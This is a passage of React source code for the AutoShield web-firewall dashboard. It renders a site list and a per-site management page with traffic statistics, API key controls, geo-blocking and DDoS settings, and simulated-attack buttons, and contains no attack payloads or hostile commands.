                <div style={{ position: 'absolute', inset: 0, background: 'rgba(8,11,16,0.95)', borderRadius: 14, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 16, zIndex: 5 }}>
                  <span style={{ fontSize: 13, color: 'var(--text)' }}>Remove <strong>{site.domain}</strong>?</span>
                  <button onClick={() => handleRemove(i)} style={{ padding: '6px 16px', background: 'rgba(239,68,68,0.2)', border: '1px solid rgba(239,68,68,0.4)', borderRadius: 6, color: '#ff6b6b', fontSize: 12, cursor: 'pointer', fontWeight: 600 }}>Yes, Remove</button>
                  <button onClick={() => setConfirmRemove(null)} style={{ padding: '6px 16px', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, color: 'var(--muted)', fontSize: 12, cursor: 'pointer' }}>Cancel</button>
                </div>
              )}

              <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
                {/* Status dot */}
                <div style={{ width: 10, height: 10, borderRadius: '50%', background: statusColor, boxShadow: isNotConfigured ? 'none' : `0 0 10px ${statusColor}`, flexShrink: 0 }} />

                {/* Main info */}
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 700, fontSize: 15 }}>{site.domain}</div>
                  <div style={{ color: 'var(--cyan)', fontFamily: 'monospace', fontSize: 12, marginTop: 4 }}>{siteUrl}</div>
                  {site.upstream_url && (
                    <div style={{ color: 'var(--e-muted)', fontFamily: 'monospace', fontSize: 10, marginTop: 4 }}>↳ upstream: {site.upstream_url}</div>
                  )}
                </div>

                {/* Health status */}
                <div style={{ textAlign: 'right', minWidth: 120 }}>
                  {isNotConfigured ? (
                    <div style={{ fontSize: 11, color: 'var(--e-muted)', background: 'rgba(255,255,255,0.05)', border: '1px dashed rgba(255,255,255,0.1)', borderRadius: 4, padding: '4px 10px' }}>⚙️ SETUP NEEDED</div>
                  ) : (
                    <div style={{ color: statusColor, fontWeight: 700, fontSize: 12 }}>{statusLabel}</div>
                  )}
                  <div style={{ color: 'var(--e-muted)', fontSize: 11, marginTop: 4, fontFamily: 'monospace' }}>
                    {isNotConfigured ? 'Add upstream URL to enable health check' : `HTTP: ${health.status_code || 'n/a'} · ${health.latency_ms ? `${health.latency_ms}ms` : 'latency n/a'}`}
                  </div>
                </div>

                {/* Actions */}
                <div style={{ display: 'flex', gap: 8, flexShrink: 0 }}>
                  <button
                    onClick={() => handleTestWAF(site)}
                    disabled={testing}
                    style={{ padding: '8px 14px', background: testing ? 'rgba(0,255,156,0.05)' : 'rgba(0,255,156,0.08)', border: '1px solid rgba(0,255,156,0.25)', borderRadius: 6, color: 'var(--green)', fontSize: 11, cursor: 'pointer', fontWeight: 700, whiteSpace: 'nowrap' }}
                  >
                    {testing ? '⏳ Testing...' : '🔬 Test WAF'}
                  </button>
                  <button onClick={() => navigate(`/my-websites/manage/${i}`)} style={{ padding: '8px 16px', background: 'rgba(56,189,248,0.1)', border: '1px solid rgba(56,189,248,0.25)', borderRadius: 6, color: 'var(--cyan)', fontSize: 12, cursor: 'pointer' }}>Manage →</button>
                  <button onClick={() => setConfirmRemove(i)} style={{ padding: '8px 12px', background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 6, color: '#ff6b6b', fontSize: 12, cursor: 'pointer' }}>✕</button>
                </div>
              </div>

              {/* WAF test result */}
              {wafResult && (
                <div style={{ marginTop: 14, padding: '10px 14px', borderRadius: 8, background: wafResult.error ? 'rgba(239,68,68,0.06)' : wafResult.would_block ? 'rgba(0,255,156,0.06)' : 'rgba(234,179,8,0.06)', border: `1px solid ${wafResult.error ? 'rgba(239,68,68,0.2)' : wafResult.would_block ? 'rgba(0,255,156,0.2)' : 'rgba(234,179,8,0.2)'}`, fontSize: 12, fontFamily: 'monospace', color: wafResult.error ? 'var(--red)' : wafResult.would_block ? 'var(--green)' : 'var(--yellow)' }}>
                  {wafResult.error || wafResult.message}
                  {wafResult.attack_type && !wafResult.error && (
                    <span style={{ marginLeft: 12, color: 'var(--e-muted)', fontSize: 10 }}>Attack: {wafResult.attack_type} | Severity: {wafResult.severity} | Confidence: {wafResult.confidence}%</span>
                  )}
                </div>
              )}
            </div>
          );
        })}

        {sites.length === 0 && (
          <div className="glass-card" style={{ textAlign: 'center', padding: '48px 24px' }}>
            <div style={{ fontSize: 40, marginBottom: 16 }}>🌐</div>
            <div style={{ fontSize: 18, fontWeight: 700, marginBottom: 8 }}>No websites yet</div>
            <p style={{ color: 'var(--e-muted)', marginBottom: 24, fontSize: 13 }}>Add your first website to start protecting it with AutoShield's WAF.</p>
            <Link to="/setup" className="evolve-btn">+ Add Your First Website</Link>
          </div>
        )}

        {sites.length > 0 && (
          <Link to="/setup" className="glass-card" style={{ display: 'flex', alignItems: 'center', gap: 16, cursor: 'pointer', border: '1px dashed rgba(255,255,255,0.1)', textDecoration: 'none', color: 'inherit' }}>
            <div style={{ width: 36, height: 36, borderRadius: '50%', background: 'rgba(56,189,248,0.1)', border: '1px solid rgba(56,189,248,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 20 }}>+</div>
            <div>
              <div style={{ fontWeight: 600, fontSize: 14 }}>Add Another Website</div>
              <div style={{ color: 'var(--e-muted)', fontSize: 12, marginTop: 2 }}>Connect a new domain to AutoShield protection</div>
            </div>
          </Link>
        )}
      </div>
    </MotionDiv>
  );
}

function ManageSite() {
  const { id } = useParams();
  const navigate = useNavigate();
  useEngineSnapshot(() => engine.getStateVersion());

  const siteIndex = Number(id);
  const domains = engine.getDomains();
  const domainEntry = domains[siteIndex];
  const [copied, setCopied] = useState(false);
  const [showKey, setShowKey] = useState(false);
  const [ddosShield, setDdosShield] = useState(false);
  const [siteStats, setSiteStats] = useState(engine.getStats());  // per-site stats
  const site = {
    id: domainEntry?.id || siteIndex,
    name: domainEntry?.domain || 'Unknown',
    url: formatSiteUrl(domainEntry?.domain),
    status: 'AGENT STREAMING',
    key: domainEntry?.key || `as_${(domainEntry?.domain || '').replace(/[^a-z0-9]/gi, '').slice(0, 8)}_key`,
    plan: domainEntry?.plan || (engine.isPremium() ? 'Premium' : 'Free'),
    region: domainEntry?.region || 'Cloud Edge',
    created: domainEntry?.created ? domainEntry.created.slice(0, 10) : new Date().toISOString().slice(0, 10),
  };
  const stats = siteStats;  // scoped to this site
  const connection = engine.getConnection();
  const log = engine.getRecentLog(200).filter(e => !e.site_id || e.site_id === domainEntry?.id);
  const blockedIPs = engine.getBlockedIPs();
  const [loading, setLoading] = useState(false);
  const health = engine.getSiteHealth(domainEntry?.id, domainEntry?.domain);

  useEffect(() => {
    if (domainEntry?.id) {
      setLoading(true);
      Promise.allSettled([
        engine.fetchState(domainEntry.id).then(s => { if (s) setSiteStats(s); }),
        engine.refreshSiteHealth(domainEntry.id, domainEntry.domain),
      ]).finally(() => setLoading(false));
      const intv = setInterval(() => {
        engine.fetchState(domainEntry.id).then(s => { if (s) setSiteStats(s); });
        engine.refreshSiteHealth(domainEntry.id, domainEntry.domain);
      }, 5000);
      return () => clearInterval(intv);
    }
  }, [domainEntry?.id]);

  const totalRequests = stats.total || 0;
  const blockRate = stats.blockRate || (totalRequests > 0 ? Math.round(((stats.blocked || 0) / totalRequests) * 100) : 0);
  const uniqueIPs = new Set(log.map(e => e.src_ip)).size;
  const byType = stats.byType || {};
  const recentLog = log.filter(e => e.site_id === domainEntry?.id || !e.site_id).slice(0, 12);
  const blocked = blockedIPs;
  const healthColor = health.status === 'UP' ? 'var(--green)' : health.status === 'DEGRADED' ? 'var(--yellow)' : health.status === 'DOWN' ? 'var(--red)' : 'var(--e-muted)';

  if (!domainEntry) {
    return (
      <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
        <div className="glass-card" style={{ textAlign: 'center', padding: '64px 24px' }}>
          <h2 style={{ margin: '0 0 8px', fontSize: 24 }}>Site not found</h2>
          <p style={{ margin: '0 0 20px', color: 'var(--e-muted)' }}>This website entry does not exist anymore.</p>
          <button onClick={() => navigate('/my-websites')} style={{ padding: '10px 18px', borderRadius: 8, border: '1px solid rgba(255,255,255,0.15)', background: 'rgba(255,255,255,0.04)', color: 'var(--text)', cursor: 'pointer' }}>
            Back to My Websites
          </button>
        </div>
      </MotionDiv>
    );
  }

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 32 }}>
        <button onClick={() => navigate('/my-websites')} style={{ background: 'transparent', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, color: 'var(--e-muted)', padding: '6px 14px', cursor: 'pointer', fontSize: 12 }}>← Back</button>
        <div>
          <h1 style={{ fontFamily: 'Anton', fontSize: '36px', margin: 0, textTransform: 'uppercase' }}>{site.name}</h1>
          <div style={{ color: 'var(--cyan)', fontFamily: 'monospace', fontSize: 13 }}>{site.url}</div>
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: 10, alignItems: 'center' }}>
          {loading
            ? <span style={{ color: 'var(--e-muted)', fontSize: 12 }}>Connecting…</span>
            : <span style={{ padding: '4px 12px', background: 'rgba(0,255,156,0.1)', border: '1px solid rgba(0,255,156,0.25)', borderRadius: 4, color: healthColor, fontSize: 11, fontWeight: 700, display: 'flex', alignItems: 'center', gap: 6 }}>
              <span style={{ width: 6, height: 6, borderRadius: '50%', background: healthColor, display: 'inline-block', animation: 'pulse-dot 1.5s ease infinite' }} />
              SITE {health.status || 'UNKNOWN'}
            </span>
          }
          <button
            onClick={() => engine.downloadReport(domainEntry?.id)}
            style={{ padding: '6px 14px', background: 'var(--green)', border: 'none', borderRadius: 6, color: '#000', fontSize: 11, fontWeight: 800, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}
          >
            <HiOutlineDocumentText /> DOWNLOAD REPORT
          </button>
          <span style={{ padding: '4px 10px', borderRadius: 4, border: '1px solid rgba(255,255,255,0.12)', color: connection.online ? 'var(--green)' : 'var(--red)', fontSize: 11 }}>
            API: {connection.online ? connection.mode.toUpperCase() : 'OFFLINE'}
          </span>
          <span style={{ padding: '4px 12px', background: 'rgba(56,189,248,0.1)', border: '1px solid rgba(56,189,248,0.25)', borderRadius: 4, color: 'var(--cyan)', fontSize: 11 }}>{site.plan}</span>
        </div>
      </div>


      {/* Top KPI row */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 16, marginBottom: 24 }}>
        {[
          { label: 'Total Requests', value: totalRequests, color: 'white', sub: 'this session' },
          { label: 'Threats Blocked', value: stats.blocked || 0, color: 'var(--green)', sub: `${blockRate}% block rate` },
          { label: 'Unique IPs', value: uniqueIPs, color: 'var(--cyan)', sub: 'distinct visitors' },
          { label: 'Blocked IPs', value: blocked.length, color: 'var(--red)', sub: 'in firewall' },
          { label: 'Threat Score', value: engine.getThreatScore(), color: engine.getThreatScore() >= 70 ? 'var(--red)' : engine.getThreatScore() >= 40 ? 'var(--yellow)' : 'var(--green)', sub: engine.getThreatScore() >= 70 ? 'CRITICAL' : 'CLEAR' },
        ].map((m, i) => (
          <div key={i} className="glass-card" style={{ padding: '18px 20px' }}>
            <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 8, letterSpacing: 1 }}>{m.label.toUpperCase()}</div>
            <div style={{ fontSize: 30, fontWeight: 800, color: m.color, lineHeight: 1 }}>{m.value}</div>
            <div style={{ fontSize: 10, color: 'var(--e-muted)', marginTop: 6 }}>{m.sub}</div>
          </div>
        ))}
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20, marginBottom: 20 }}>
        {/* Site Info */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>SITE INFORMATION</div>
          {[
            { label: 'Domain', value: site.url },
            { label: 'Protection Plan', value: site.plan },
            { label: 'Deployment Region', value: site.region },
            { label: 'Agent Status', value: '● Streaming Real-time', color: 'var(--green)' },
            { label: 'Log Ingest Format', value: 'Apache Combined' },
            { label: 'WAF Engine', value: 'AutoShield v3.7' },
            { label: 'Rule Set', value: '25 active rules (v1)' },
            { label: 'Rate Limit Window', value: '60s / 5 req max' },
            { label: 'Block Threshold', value: 'CRITICAL & above' },
            { label: 'Alert on New IP', value: 'Enabled' },
            { label: 'SSL/TLS', value: 'Enforced' },
            { label: 'Connected Since', value: site.created },
            { label: 'HTTP Status', value: health.status_code || 'n/a' },
            { label: 'Latency', value: health.latency_ms ? `${health.latency_ms} ms` : 'n/a', color: healthColor },
          ].map(({ label, value, color }) => (
            <div key={label} style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 0', borderBottom: '1px solid rgba(255,255,255,0.04)', fontSize: 13 }}>
              <span style={{ color: 'var(--e-muted)' }}>{label}</span>
              <span style={{ fontFamily: 'monospace', color: color || 'white' }}>{value}</span>
            </div>
          ))}
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 0', fontSize: 13 }}>
            <span style={{ color: 'var(--e-muted)' }}>API Key</span>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              {showKey ? (
                <span style={{ fontFamily: 'monospace', color: 'var(--cyan)' }}>{site.key}</span>
              ) : (
                <span style={{ fontFamily: 'monospace', color: 'var(--cyan)', letterSpacing: 2 }}>●●●●●●●●●●●●●</span>
              )}
              <button
                onClick={() => setShowKey(!showKey)}
                style={{ padding: '4px 10px', background: 'transparent', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 4, color: 'var(--e-muted)', fontSize: 11, cursor: 'pointer' }}
              >
                {showKey ? 'Hide' : 'Reveal'}
              </button>
              <button
                onClick={() => {
                  navigator.clipboard.writeText(site.key);
                  setCopied(true);
                  setTimeout(() => setCopied(false), 1800);
                }}
                title="Copy API Key"
                style={{ padding: '4px 10px', background: copied ? 'rgba(0,255,156,0.15)' : 'rgba(255,255,255,0.05)', border: `1px solid ${copied ? 'rgba(0,255,156,0.3)' : 'rgba(255,255,255,0.1)'}`, borderRadius: 4, color: copied ? 'var(--green)' : 'var(--e-muted)', fontSize: 11, cursor: 'pointer', transition: 'all 0.2s' }}
              >
                {copied ? '✓ Copied' : '⎘ Copy'}
              </button>
            </div>
          </div>
        </div>

        {/* Site Configuration */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>WAF POLICY & EXTREME MEASURES</div>

          <div style={{ marginBottom: 16 }}>
            <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 6 }}>RATE LIMIT WINDOW (SECONDS)</label>
            <input className="input" type="number" defaultValue={60} style={{ width: '100%' }} />
          </div>

          <div style={{ marginBottom: 16 }}>
            <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 6 }}>BLOCK THRESHOLD (SCORE &gt; X)</label>
            <input className="input" type="number" defaultValue={75} style={{ width: '100%' }} />
          </div>

          <div style={{ marginBottom: 24 }}>
            <label style={{ display: 'block', fontSize: 11, color: 'var(--e-muted)', marginBottom: 6 }}>GEOGRAPHIC IP BLOCKING (RESTRICT COUNTRIES)</label>
            <input
              className="input"
              type="text"
              placeholder="e.g. RU, CN, IR"
              defaultValue={domainEntry?.config?.blocked_countries?.join(', ') || ''}
              style={{ width: '100%' }}
              onBlur={(e) => {
                const val = e.target.value.trim();
                if (val && !engine.isPremium()) {
                  alert("Geofencing is an Enterprise Premium feature.");
                  e.target.value = "";
                  return;
                }
                const countries = val ? val.split(',').map(c => c.trim().toUpperCase()) : [];
                engine.updateSiteConfig(domainEntry.id, { ...domainEntry.config, blocked_countries: countries });
              }}
            />
          </div>

          <div style={{ padding: '16px', borderRadius: '8px', border: ddosShield ? '1px solid rgba(255,77,77,0.4)' : '1px dashed rgba(255,255,255,0.1)', background: ddosShield ? 'rgba(255,77,77,0.05)' : 'background', display: 'flex', justifyContent: 'space-between', alignItems: 'center', transition: 'all 0.3s ease' }}>
            <div>
              <div style={{ fontSize: 14, fontWeight: 700, color: ddosShield ? 'var(--red)' : 'white' }}>DDoS Shield Protocol</div>
              <div style={{ fontSize: 11, color: 'var(--e-muted)', marginTop: 4 }}>Premium only. Lowers connection threshold severely.</div>
            </div>
            <button
              className={ddosShield ? "evolve-btn ddos-active" : "tab-btn"}
              style={{ background: ddosShield ? 'var(--red)' : '', borderColor: ddosShield ? 'var(--red)' : '', padding: '10px 16px' }}
              onClick={() => {
                if (engine.isPremium()) {
                  setDdosShield(!ddosShield);
                  fetch(`${API_URL}/ddos/engage?site_id=${site.id}&active=${!ddosShield ? '1' : '0'}`)
                    .catch(e => console.error(e));
                } else {
                  alert("DDoS Shield is a Premium Enterprise Feature. Please upgrade.");
                }
              }}
            >
              {ddosShield ? 'SHIELD ENGAGED 🚨' : 'ENGAGE SHIELD'}
            </button>
          </div>
        </div>

        {/* Attack Type Breakdown */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>ATTACK TYPE DISTRIBUTION</div>

          {Object.keys(byType).length === 0 ? (
            <div style={{ color: 'var(--e-muted)', textAlign: 'center', padding: '40px 0', fontSize: 13 }}>No attacks recorded yet.<br />Send a test SQLi to see telemetry!</div>
          ) : (
            Object.entries(byType).sort((a, b) => b[1] - a[1]).map(([type, count]) => {
              const pct = Math.round((count / Math.max(totalRequests, 1)) * 100);
              return (
                <div key={type} style={{ marginBottom: 14 }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6, fontSize: 12 }}>
                    <span style={{ color: TYPE_COLORS[type] || 'white', fontWeight: 600 }}>{type}</span>
                    <span style={{ color: 'var(--e-muted)' }}>{count} hits ({pct}%)</span>
                  </div>
                  <div style={{ height: 6, background: 'rgba(255,255,255,0.05)', borderRadius: 3 }}>
                    <div style={{ width: `${pct}%`, height: '100%', background: TYPE_COLORS[type] || 'var(--cyan)', borderRadius: 3, transition: 'width 0.6s ease' }} />
                  </div>
                </div>
              );
            })
          )}

          {/* ATTACK SIMULATOR BUTTONS */}
          <div style={{ marginTop: 24, padding: 16, background: 'rgba(255,255,255,0.02)', borderRadius: 12, border: '1px dashed rgba(255,255,255,0.08)' }}>
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--e-muted)', marginBottom: 12, letterSpacing: 1 }}>THREAT SIMULATION</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
              {ATTACK_TYPES.slice(0, 4).map(type => (
                <button
                  key={type}
                  className="attack-btn"
                  onClick={() => engine.simulateBurst(type, domainEntry?.id)}
                  style={{ fontSize: 11, padding: '8px', border: '1px solid rgba(255,77,77,0.2)', color: '#ff4d4d' }}
                >
                  🚀 {type} BURST
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Hosting Metrics */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 16, marginBottom: 20 }}>
        {[
          { label: 'Uptime', value: '99.99%', icon: '🟢' },
          { label: 'Avg Response', value: '12ms', icon: '⚡' },
          { label: 'SSL Status', value: 'Secured', icon: '🔒' },
          { label: 'WAF Mode', value: 'Active', icon: '🛡️' },
        ].map((m, i) => (
          <div key={i} className="glass-card" style={{ textAlign: 'center' }}>
            <div style={{ fontSize: 24, marginBottom: 8 }}>{m.icon}</div>
            <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 4 }}>{m.label.toUpperCase()}</div>
            <div style={{ fontSize: 20, fontWeight: 700, color: 'var(--green)' }}>{m.value}</div>
          </div>
        ))}
      </div>

      {/* Per-Site Attack Origin Map */}
      <SiteGeoMap log={log} />

      {/* Live Traffic Feed */}
      <div className="glass-card" style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 14 }}>
          <span style={{ fontSize: 13, fontWeight: 700 }}>Live Traffic Feed</span>
          <span className="neon-pill"><span style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green)', display: 'inline-block', animation: 'pulse-dot 1.5s ease infinite' }} /> LIVE</span>
        </div>
        <div className="feed" style={{ maxHeight: 280 }}>
          {recentLog.length === 0 && <div className="feed-empty">🟢 No traffic yet — fire a curl request at {site.url} to see it here</div>}
          {recentLog.map((ev) => {
            const isBenign = ev.attack_type === 'Benign' || ev.severity === 'INFO';
            return (
              <div className="feed-item" key={ev.id} style={isBenign ? { opacity: 0.7 } : {}}>
                <span style={{ color: 'var(--muted2)' }}>{ev.timestamp?.slice(11, 19)}</span>
                <span style={{ color: isBenign ? '#4A6080' : SEV_COLORS[ev.severity], fontWeight: 600 }}>{isBenign ? 'VISIT' : `[${ev.severity?.slice(0, 4)}]`}</span>
                <span style={{ color: isBenign ? '#4A6080' : TYPE_COLORS[ev.attack_type] }}>{isBenign ? '🌐 Visitor' : ev.attack_type}</span>
                <span style={{ color: 'var(--text)' }}>{ev.src_ip}</span>
                <span style={{ color: isBenign ? 'var(--e-muted)' : ev.action === 'BLOCKED' ? 'var(--green)' : 'var(--yellow)' }}>{isBenign ? 'ALLOWED' : ev.action}</span>
                <span style={{ color: isBenign ? '#4A6080' : 'var(--cyan)', fontSize: 10, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '220px' }}>{ev.payload}</span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Traffic Trend Chart */}
      <div className="glass-card" style={{ marginBottom: 20 }}>
        <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>TRAFFIC & THREAT TREND</div>
        {(() => {
          const chartData = [...log].reverse().reduce((acc, ev, i) => {
            const prev = acc.length ? acc[acc.length - 1] : { attacks: 0, blocked: 0 };
            return [...acc, { t: ev.timestamp?.slice(11, 16) || '', attacks: i + 1, blocked: ev.action === 'BLOCKED' ? prev.blocked + 1 : prev.blocked }];
          }, []).slice(-20);
          return chartData.length === 0
            ? <div style={{ color: 'var(--e-muted)', textAlign: 'center', padding: '24px 0', fontSize: 13 }}>No traffic recorded yet</div>
            : (
              <ResponsiveContainer width="100%" height={160}>
                <AreaChart data={chartData}>
                  <defs>
                    <linearGradient id="mgA" x1="0" y1="0" x2="0" y2="1"><stop offset="5%" stopColor="var(--cyan)" stopOpacity={0.3} /><stop offset="95%" stopColor="var(--cyan)" stopOpacity={0} /></linearGradient>
                  </defs>
                  <XAxis dataKey="t" tick={{ fill: '#4A6080', fontSize: 10 }} axisLine={false} tickLine={false} />
                  <YAxis tick={{ fill: '#4A6080', fontSize: 10 }} axisLine={false} tickLine={false} />
                  <Tooltip contentStyle={{ background: '#11161C', border: '1px solid #1C2535', borderRadius: 8, fontSize: 11 }} />
                  <Area type="monotone" dataKey="attacks" stroke="var(--cyan)" fill="url(#mgA)" strokeWidth={2} name="Requests" />
                  <Area type="monotone" dataKey="blocked" stroke="var(--red)" fill="none" strokeWidth={1.5} strokeDasharray="4 2" name="Blocked" />
                </AreaChart>
              </ResponsiveContainer>
            );
        })()}
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 20, marginBottom: 20 }}>
        {/* Bandwidth */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>BANDWIDTH USAGE</div>
          {[
            { label: 'Inbound', value: `${(totalRequests * 1.2).toFixed(1)} KB`, pct: Math.min((totalRequests / 200) * 100, 100) },
            { label: 'Outbound', value: `${(totalRequests * 4.8).toFixed(1)} KB`, pct: Math.min((totalRequests / 80) * 100, 100) },
            { label: 'Total', value: `${((totalRequests * 1.2 + totalRequests * 4.8) / 1024).toFixed(2)} MB`, pct: Math.min((totalRequests / 50) * 100, 100) },
          ].map(({ label, value, pct }) => (
            <div key={label} style={{ marginBottom: 14 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 12, marginBottom: 6 }}>
                <span style={{ color: 'var(--e-muted)' }}>{label}</span>
                <span style={{ fontFamily: 'monospace', color: 'white' }}>{value}</span>
              </div>
              <div style={{ height: 5, background: 'rgba(255,255,255,0.05)', borderRadius: 3 }}>
                <div style={{ width: `${pct}%`, height: '100%', background: 'var(--cyan)', borderRadius: 3 }} />
              </div>
            </div>
          ))}
          <div style={{ marginTop: 16, padding: '10px 12px', background: 'rgba(0,0,0,0.3)', borderRadius: 6, fontSize: 11, color: 'var(--e-muted)' }}>
            Plan Limit: <span style={{ color: 'white' }}>1 TB / month</span>
          </div>
        </div>

        {/* HTTP Status Codes */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>HTTP STATUS CODES</div>
          {[
            { code: '200 OK', count: Math.max(totalRequests - stats.blocked, 0), color: 'var(--green)' },
            { code: '403 Forbidden', count: stats.blocked || 0, color: 'var(--red)' },
            { code: '404 Not Found', count: Math.floor(totalRequests * 0.05), color: 'var(--yellow)' },
            { code: '500 Server Error', count: 0, color: 'var(--orange)' },
          ].map(({ code, count, color }) => {
            const pct = totalRequests > 0 ? Math.round((count / totalRequests) * 100) : 0;
            return (
              <div key={code} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 0', borderBottom: '1px solid rgba(255,255,255,0.04)', fontSize: 12 }}>
                <span style={{ fontFamily: 'monospace', color }}>{code}</span>
                <span style={{ color: 'var(--e-muted)' }}>{count} <span style={{ fontSize: 10 }}>({pct}%)</span></span>
              </div>
            );
          })}
        </div>

        {/* Bot vs Human */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>BOT VS HUMAN RATIO</div>
          {(() => {
            const bots = stats.blocked || 0;
            const humans = Math.max(totalRequests - bots, 0);
            const botPct = totalRequests > 0 ? Math.round((bots / totalRequests) * 100) : 0;
            const humanPct = 100 - botPct;
            return (
              <>
                <div style={{ display: 'flex', height: 12, borderRadius: 6, overflow: 'hidden', marginBottom: 16 }}>
                  <div style={{ width: `${humanPct}%`, background: 'var(--green)' }} />
                  <div style={{ width: `${botPct}%`, background: 'var(--red)' }} />
                </div>
                {[
                  { label: '🧑 Human Traffic', count: humans, pct: humanPct, color: 'var(--green)' },
                  { label: '🤖 Bot / Attack', count: bots, pct: botPct, color: 'var(--red)' },
                ].map(({ label, count, pct, color }) => (
                  <div key={label} style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 0', fontSize: 13 }}>
                    <span style={{ color: 'var(--e-muted)' }}>{label}</span>
                    <span style={{ color, fontWeight: 700 }}>{count} <span style={{ fontWeight: 400, fontSize: 11 }}>({pct}%)</span></span>
                  </div>
                ))}
                <div style={{ marginTop: 14, padding: '10px 12px', background: 'rgba(255,77,77,0.06)', border: '1px solid rgba(255,77,77,0.15)', borderRadius: 6, fontSize: 11, color: 'var(--e-muted)' }}>
                  {botPct > 20 ? '⚠️ Elevated bot activity detected' : '✓ Traffic pattern healthy'}
                </div>
              </>
            );
          })()}
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20, marginBottom: 20 }}>
        {/* Top Requested Paths */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>TOP REQUESTED PATHS</div>
          {(() => {
            const pathCounts = {};
            log.forEach(ev => {
              const path = (ev.payload || '/').split('?')[0] || '/';
              pathCounts[path] = (pathCounts[path] || 0) + 1;
            });
            const topPaths = Object.entries(pathCounts).sort((a, b) => b[1] - a[1]).slice(0, 6);
            return topPaths.length === 0
              ? <div style={{ color: 'var(--e-muted)', fontSize: 13 }}>No path data yet</div>
              : topPaths.map(([path, count]) => (
                <div key={path} style={{ display: 'flex', justifyContent: 'space-between', padding: '7px 0', borderBottom: '1px solid rgba(255,255,255,0.04)', fontSize: 12 }}>
                  <span style={{ fontFamily: 'monospace', color: 'var(--cyan)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '200px' }}>{path}</span>
                  <span style={{ color: 'var(--e-muted)' }}>{count} hits</span>
                </div>
              ));
          })()}
        </div>

        {/* Top Source IPs */}
        <div className="glass-card">
          <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>TOP SOURCE IPs</div>
          {(() => {
            const ipCounts = {};
            log.forEach(ev => { ipCounts[ev.src_ip] = (ipCounts[ev.src_ip] || 0) + 1; });
            const topIPs = Object.entries(ipCounts).sort((a, b) => b[1] - a[1]).slice(0, 6);
            return topIPs.length === 0
              ? <div style={{ color: 'var(--e-muted)', fontSize: 13 }}>No IP data yet</div>
              : topIPs.map(([ip, count]) => {
                const isBlocked = blocked.includes(ip);
                return (
                  <div key={ip} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: '1px solid rgba(255,255,255,0.04)', fontSize: 12 }}>
                    <span style={{ fontFamily: 'monospace', color: isBlocked ? 'var(--red)' : 'white' }}>{ip}</span>
                    <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                      <span style={{ color: 'var(--e-muted)' }}>{count} req</span>
                      {isBlocked && <span style={{ fontSize: 9, padding: '2px 6px', background: 'rgba(255,77,77,0.15)', color: 'var(--red)', borderRadius: 3 }}>BLOCKED</span>}
                    </div>
                  </div>
                );
              });
          })()}
        </div>
      </div>

      {/* Response Time Distribution */}
      <div className="glass-card">
